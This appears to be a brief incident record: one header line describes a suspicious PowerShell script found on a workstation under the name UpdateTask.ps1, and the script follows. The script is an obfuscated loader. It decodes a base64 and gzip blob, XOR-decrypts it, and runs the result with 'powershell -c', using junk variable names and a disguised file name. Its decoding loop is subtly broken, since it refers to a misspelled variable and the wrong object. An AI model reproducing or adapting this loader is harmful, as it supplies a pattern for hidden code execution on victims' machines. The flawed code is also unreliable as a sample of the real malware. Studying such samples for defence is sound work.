# Suspicious PowerShell Script Found on Workstation
# Location: C:\Users\Public\Documents\UpdateTask.ps1
# --- 
$eNcBlO = "H4sIAGSZ72kC/y2MwQrCMBAF8ahUk4rVgyRQYruH7Kab0G7Brwk5C7n6+bbg8Q0zr4Gu+juopOkKWp6lJicln44X9bUtvWRxDFb5niluy3YeR1qiPazMgHIDjp7Q6hXP2EMutXETlPzXHml0Arzh2YWShQSiCTB4MUhiJhf2+w+89zIxpdIKexx+iAuHe5YAAAA="

$bytes = [System.Convert]::FromBase64String($eNcBlO)

$sm56rrw80 = New-Object System.IO.MemoryStream(,$bytes)
$zg1zxcv4hn = New-Object System.IO.Compression.GzipStream($sm56rrw80, [System.IO.Compression.CompressionMode]::Decompress)
$0pl8ikrs = New-Object System.IO.StreamReader($zg1zxcv4hn)
$content = $0pl8ikrs.ReadToEnd()

$yt445Ekk8 = 0x42
$lanif = ""
foreach ($i in $conent.ToCharArray()) {
    $lanif += [char]([int]$bytes -bxor $yt445Ekk8)
}

powershell -c $lanif
